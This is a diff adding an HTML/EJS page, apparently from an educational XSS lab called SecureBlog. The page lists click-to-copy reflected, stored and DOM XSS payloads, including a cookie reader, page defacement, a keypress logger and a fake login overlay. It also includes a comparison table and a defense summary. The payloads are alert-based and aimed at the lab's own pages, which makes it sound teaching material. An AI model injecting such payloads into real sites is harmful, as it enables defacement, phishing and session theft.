@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Playground — SecureBlog</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #e2e8f0; }
+    .navbar { background: #1e293b; padding: 16px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
+    .navbar h1 { color: #38bdf8; font-size: 20px; }
+    .navbar a { color: #94a3b8; text-decoration: none; margin-left: 20px; font-size: 14px; }
+    .navbar a:hover { color: #38bdf8; }
+    .safe-toggle form { display: inline; }
+    .safe-toggle button { padding: 6px 14px; border: none; border-radius: 6px; font-size: 13px; cursor: pointer; font-weight: bold; }
+    .safe-on { background: #22c55e; color: white; }
+    .safe-off { background: #ef4444; color: white; }
+    .container { max-width: 1000px; margin: 0 auto; padding: 30px 40px; }
+    code { background: #334155; padding: 2px 6px; border-radius: 4px; font-size: 13px; color: #fbbf24; }
+    .concept-box { background: #1e293b; border-left: 3px solid #fbbf24; padding: 16px 20px; margin: 16px 0; border-radius: 0 8px 8px 0; }
+    .concept-box h3 { color: #fbbf24; font-size: 14px; margin-bottom: 6px; }
+    .concept-box p, .concept-box li { color: #94a3b8; font-size: 13px; line-height: 1.6; }
+    .concept-box ul { padding-left: 16px; }
+    .attack-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; margin: 16px 0; }
+    .attack-card h3 { margin-bottom: 8px; font-size: 16px; }
+    .attack-card p { color: #94a3b8; font-size: 13px; margin-bottom: 12px; }
+    .payload-box { background: #0f172a; border: 1px solid #475569; border-radius: 8px; padding: 10px 14px; font-family: 'Consolas', monospace; font-size: 13px; color: #f87171; margin: 8px 0; cursor: pointer; position: relative; word-break: break-all; }
+    .payload-box:hover { border-color: #ef4444; }
+    .payload-box .copy-hint { position: absolute; right: 8px; top: 8px; font-size: 10px; color: #64748b; }
+    .tag { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; margin-right: 6px; }
+    .tag-reflected { background: #3b82f620; color: #60a5fa; border: 1px solid #3b82f6; }
+    .tag-stored { background: #ef444420; color: #f87171; border: 1px solid #ef4444; }
+    .tag-dom { background: #f59e0b20; color: #fcd34d; border: 1px solid #f59e0b; }
+    .tag-level { font-size: 10px; }
+    .tag-easy { background: #22c55e20; color: #4ade80; border: 1px solid #22c55e; }
+    .tag-medium { background: #f59e0b20; color: #fcd34d; border: 1px solid #f59e0b; }
+    .tag-advanced { background: #ef444420; color: #f87171; border: 1px solid #ef4444; }
+    .try-btn { display: inline-block; padding: 6px 16px; border-radius: 6px; text-decoration: none; font-size: 13px; font-weight: bold; }
+    .try-reflected { background: #3b82f6; color: white; }
+    .try-stored { background: #ef4444; color: white; }
+    .try-dom { background: #f59e0b; color: #000; }
+    .result-box { padding: 12px; border-radius: 8px; margin: 12px 0; font-size: 13px; }
+    .result-danger { background: #4c1d2e; border: 1px solid #ef4444; color: #fca5a5; }
+    .result-safe { background: #064e3b; border: 1px solid #059669; color: #6ee7b7; }
+    .section-title { display: flex; align-items: center; gap: 10px; margin: 30px 0 16px 0; padding-bottom: 8px; border-bottom: 1px solid #334155; }
+    .footer { margin-top: 40px; padding: 20px 40px; border-top: 1px solid #334155; color: #64748b; font-size: 13px; text-align: center; }
+    .copied { color: #22c55e !important; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    @media (max-width: 700px) { .grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+  <nav class="navbar">
+    <div style="display: flex; align-items: center; gap: 20px;">
+      <h1>🛡️ SecureBlog</h1>
+      <a href="/">Home</a>
+      <a href="/search">Search</a>
+      <a href="/dom-xss">DOM XSS</a>
+      <a href="/playground">⚔️ Playground</a>
+    </div>
+    <div class="safe-toggle">
+      <form action="/toggle-safe-mode" method="POST">
+        <button class="<%= safeMode ? 'safe-on' : 'safe-off' %>">
+          <%= safeMode ? '🛡️ SAFE' : '🔴 UNSAFE' %>
+        </button>
+      </form>
+    </div>
+  </nav>
+
+  <div class="container">
+    <h2 style="color: #38bdf8; margin-bottom: 8px;">⚔️ XSS Attack Playground</h2>
+    <p style="color: #94a3b8; margin-bottom: 16px;">
+      Pre-built attack payloads for all 3 XSS types. Click a payload to copy it, then try it on the corresponding page.
+    </p>
+
+    <% if (!safeMode) { %>
+      <div class="result-box result-danger">
+        🔴 UNSAFE MODE — All attacks below will work! Try them one by one.
+      </div>
+    <% } else { %>
+      <div class="result-box result-safe">
+        🛡️ SAFE MODE — Attacks are blocked. Toggle to UNSAFE to see them work.
+      </div>
+    <% } %>
+
+    <!-- ============================================ -->
+    <!-- REFLECTED XSS PAYLOADS                       -->
+    <!-- ============================================ -->
+    <div class="section-title">
+      <h3 style="color: #60a5fa;">💥 Reflected XSS Payloads</h3>
+      <span class="tag tag-reflected">REFLECTED</span>
+    </div>
+    <p style="color: #64748b; font-size: 13px; margin-bottom: 12px;">
+      These payloads go through the URL query string → server → response. Paste them in the <strong>search box</strong>.
+    </p>
+
+    <div class="grid">
+      <div class="attack-card">
+        <h3 style="color: #60a5fa;">1. Basic Script Tag <span class="tag tag-level tag-easy">EASY</span></h3>
+        <p>The classic XSS — inject a <code>&lt;script&gt;</code> tag directly.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;script&gt;alert('Reflected XSS!')&lt;/script&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/search?q=%3Cscript%3Ealert('Reflected%20XSS!')%3C/script%3E" class="try-btn try-reflected">🚀 Try it →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #60a5fa;">2. IMG Tag Error <span class="tag tag-level tag-easy">EASY</span></h3>
+        <p>No script tag needed — <code>onerror</code> fires when the image fails to load.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;img src="x" onerror="alert('XSS via img!')"&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/search?q=%3Cimg%20src=%22x%22%20onerror=%22alert('XSS%20via%20img!')%22%3E" class="try-btn try-reflected">🚀 Try it →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #60a5fa;">3. SVG + onload <span class="tag tag-level tag-medium">MEDIUM</span></h3>
+        <p>SVG tags also support event handlers like <code>onload</code>.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;svg onload="alert('SVG XSS!')"&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/search?q=%3Csvg%20onload=%22alert('SVG%20XSS!')%22%3E" class="try-btn try-reflected">🚀 Try it →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #60a5fa;">4. Cookie Stealer <span class="tag tag-level tag-advanced">ADVANCED</span></h3>
+        <p>Reads <code>document.cookie</code> — this is how real attackers steal sessions.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;script&gt;alert('Cookies: ' + document.cookie)&lt;/script&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/search?q=%3Cscript%3Ealert('Cookies%3A%20'%2Bdocument.cookie)%3C%2Fscript%3E" class="try-btn try-reflected">🚀 Try it →</a>
+      </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- STORED XSS PAYLOADS                          -->
+    <!-- ============================================ -->
+    <div class="section-title">
+      <h3 style="color: #f87171;">💾 Stored XSS Payloads</h3>
+      <span class="tag tag-stored">STORED</span>
+    </div>
+    <p style="color: #64748b; font-size: 13px; margin-bottom: 12px;">
+      These payloads get saved to the database and execute for <strong>every visitor</strong>. Paste them as blog <strong>comments</strong>.
+    </p>
+
+    <div class="grid">
+      <div class="attack-card">
+        <h3 style="color: #f87171;">1. Alert in Comment <span class="tag tag-level tag-easy">EASY</span></h3>
+        <p>Post this as a comment on any blog post.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;script&gt;alert('Stored XSS! I run for every visitor!')&lt;/script&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/post/1" class="try-btn try-stored">📝 Go to Post →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #f87171;">2. Page Defacement <span class="tag tag-level tag-medium">MEDIUM</span></h3>
+        <p>Changes the entire page content — this is what real defacement looks like.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;script&gt;document.body.innerHTML='&lt;h1 style="color:red;text-align:center;margin-top:200px"&gt;🏴‍☠️ HACKED!&lt;/h1&gt;'&lt;/script&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/post/1" class="try-btn try-stored">📝 Go to Post →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #f87171;">3. Keylogger <span class="tag tag-level tag-advanced">ADVANCED</span></h3>
+        <p>Captures every keystroke on the page — a real attack scenario.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;script&gt;document.onkeypress=function(e){document.title+='['+e.key+']'}&lt;/script&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/post/1" class="try-btn try-stored">📝 Go to Post →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #f87171;">4. Fake Login Form <span class="tag tag-level tag-advanced">ADVANCED</span></h3>
+        <p>Injects a fake login form to phish credentials from users.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;div style="background:white;padding:20px;border-radius:8px;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:9999;color:black"&gt;&lt;h3&gt;Session Expired&lt;/h3&gt;&lt;input placeholder="Username" style="display:block;margin:8px 0"&gt;&lt;input placeholder="Password" type="password" style="display:block;margin:8px 0"&gt;&lt;button onclick="alert('Credentials stolen!')"&gt;Login&lt;/button&gt;&lt;/div&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/post/1" class="try-btn try-stored">📝 Go to Post →</a>
+      </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- DOM XSS PAYLOADS                             -->
+    <!-- ============================================ -->
+    <div class="section-title">
+      <h3 style="color: #fcd34d;">🧩 DOM XSS Payloads</h3>
+      <span class="tag tag-dom">DOM</span>
+    </div>
+    <p style="color: #64748b; font-size: 13px; margin-bottom: 12px;">
+      These payloads go into the URL hash (<code>#...</code>). The server <strong>never sees them</strong> —
+      JavaScript on the page reads them and renders unsafely.
+    </p>
+
+    <div class="grid">
+      <div class="attack-card">
+        <h3 style="color: #fcd34d;">1. IMG via Hash <span class="tag tag-level tag-easy">EASY</span></h3>
+        <p>Put an <code>&lt;img&gt;</code> tag in the URL hash for <code>innerHTML</code> to parse.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;img src=x onerror=alert('DOM XSS!')&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/dom-xss#%3Cimg%20src%3Dx%20onerror%3Dalert('DOM%20XSS!')%3E" class="try-btn try-dom">🧩 Try it →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #fcd34d;">2. Bold Text Injection <span class="tag tag-level tag-easy">EASY</span></h3>
+        <p>Even non-script HTML is a problem — injecting styled text to mislead users.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;b style="color:red;font-size:24px"&gt;⚠️ ACCOUNT SUSPENDED&lt;/b&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/dom-xss#%3Cb%20style=%22color:red;font-size:24px%22%3E⚠️%20ACCOUNT%20SUSPENDED%3C/b%3E" class="try-btn try-dom">🧩 Try it →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #fcd34d;">3. SVG via Hash <span class="tag tag-level tag-medium">MEDIUM</span></h3>
+        <p>SVG with <code>onload</code> works through innerHTML too.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;svg onload="alert('DOM XSS via SVG!')"&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/dom-xss#%3Csvg%20onload=%22alert('DOM%20XSS%20via%20SVG!')%22%3E" class="try-btn try-dom">🧩 Try it →</a>
+      </div>
+
+      <div class="attack-card">
+        <h3 style="color: #fcd34d;">4. Redirect via Hash <span class="tag tag-level tag-advanced">ADVANCED</span></h3>
+        <p>Uses an iframe to redirect — would send user to an attacker's site.</p>
+        <div class="payload-box" onclick="copyPayload(this)">
+          &lt;iframe src="javascript:alert('Redirected!')" style="display:none"&gt;&lt;/iframe&gt;
+          <span class="copy-hint">click to copy</span>
+        </div>
+        <a href="/dom-xss#%3Ciframe%20src=%22javascript:alert('Redirected!')%22%20style=%22display:none%22%3E%3C/iframe%3E" class="try-btn try-dom">🧩 Try it →</a>
+      </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- CHEAT SHEET                                  -->
+    <!-- ============================================ -->
+    <div class="concept-box" style="margin-top: 30px;">
+      <h3>📋 XSS Comparison Cheat Sheet</h3>
+      <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
+        <tr style="border-bottom: 1px solid #334155;">
+          <th style="text-align: left; padding: 8px; color: #e2e8f0;">Aspect</th>
+          <th style="text-align: left; padding: 8px; color: #60a5fa;">Reflected</th>
+          <th style="text-align: left; padding: 8px; color: #f87171;">Stored</th>
+          <th style="text-align: left; padding: 8px; color: #fcd34d;">DOM</th>
+        </tr>
+        <tr style="border-bottom: 1px solid #1e293b;">
+          <td style="padding: 8px; color: #94a3b8;">Payload location</td>
+          <td style="padding: 8px; color: #94a3b8;">URL parameter</td>
+          <td style="padding: 8px; color: #94a3b8;">Database</td>
+          <td style="padding: 8px; color: #94a3b8;">URL fragment (#)</td>
+        </tr>
+        <tr style="border-bottom: 1px solid #1e293b;">
+          <td style="padding: 8px; color: #94a3b8;">Server involved?</td>
+          <td style="padding: 8px; color: #94a3b8;">Yes — reflects input</td>
+          <td style="padding: 8px; color: #94a3b8;">Yes — stores + serves</td>
+          <td style="padding: 8px; color: #94a3b8;">No — client-side only</td>
+        </tr>
+        <tr style="border-bottom: 1px solid #1e293b;">
+          <td style="padding: 8px; color: #94a3b8;">Persistence</td>
+          <td style="padding: 8px; color: #94a3b8;">None (1 request)</td>
+          <td style="padding: 8px; color: #94a3b8;">Permanent</td>
+          <td style="padding: 8px; color: #94a3b8;">None (URL-based)</td>
+        </tr>
+        <tr style="border-bottom: 1px solid #1e293b;">
+          <td style="padding: 8px; color: #94a3b8;">Victim must...</td>
+          <td style="padding: 8px; color: #94a3b8;">Click malicious link</td>
+          <td style="padding: 8px; color: #94a3b8;">Visit the page</td>
+          <td style="padding: 8px; color: #94a3b8;">Click crafted URL</td>
+        </tr>
+        <tr style="border-bottom: 1px solid #1e293b;">
+          <td style="padding: 8px; color: #94a3b8;">Server-side defense</td>
+          <td style="padding: 8px; color: #94a3b8;">Output encoding</td>
+          <td style="padding: 8px; color: #94a3b8;">Input sanitization + encoding</td>
+          <td style="padding: 8px; color: #94a3b8;">Not possible</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px; color: #94a3b8;">Client-side defense</td>
+          <td style="padding: 8px; color: #94a3b8;">CSP headers</td>
+          <td style="padding: 8px; color: #94a3b8;">CSP headers</td>
+          <td style="padding: 8px; color: #94a3b8;">textContent, DOMPurify</td>
+        </tr>
+      </table>
+    </div>
+
+    <div class="concept-box">
+      <h3>🛡️ Defense Summary</h3>
+      <ul>
+        <li><strong>Output Encoding:</strong> Use <code>&lt;%= %&gt;</code> in EJS (escapes HTML) instead of <code>&lt;%- %&gt;</code> (raw)</li>
+        <li><strong>Input Validation:</strong> Reject or strip HTML from user inputs on the server</li>
+        <li><strong>CSP Header:</strong> <code>Content-Security-Policy: default-src 'self'</code> blocks inline scripts</li>
+        <li><strong>HttpOnly Cookies:</strong> <code>Set-Cookie: session=abc; HttpOnly</code> prevents JS from reading cookies</li>
+        <li><strong>DOM Safety:</strong> Use <code>textContent</code> / <code>setAttribute()</code> instead of <code>innerHTML</code></li>
+        <li><strong>DOMPurify:</strong> If you MUST render HTML, sanitize it with a library first</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="footer">
+    🛡️ Project 3: XSS Attack & Defense — Playground
+  </div>
+
+  <script>
+    function copyPayload(element) {
+      const text = element.textContent.replace('click to copy', '').trim();
+      // Decode HTML entities for clipboard
+      const textarea = document.createElement('textarea');
+      textarea.innerHTML = text;
+      const decoded = textarea.value;
+
+      navigator.clipboard.writeText(decoded).then(() => {
+        const hint = element.querySelector('.copy-hint');
+        hint.textContent = '✅ Copied!';
+        hint.classList.add('copied');
+        setTimeout(() => {
+          hint.textContent = 'click to copy';
+          hint.classList.remove('copied');
+        }, 1500);
+      });
+    }
+  </script>
+</body>
+</html>
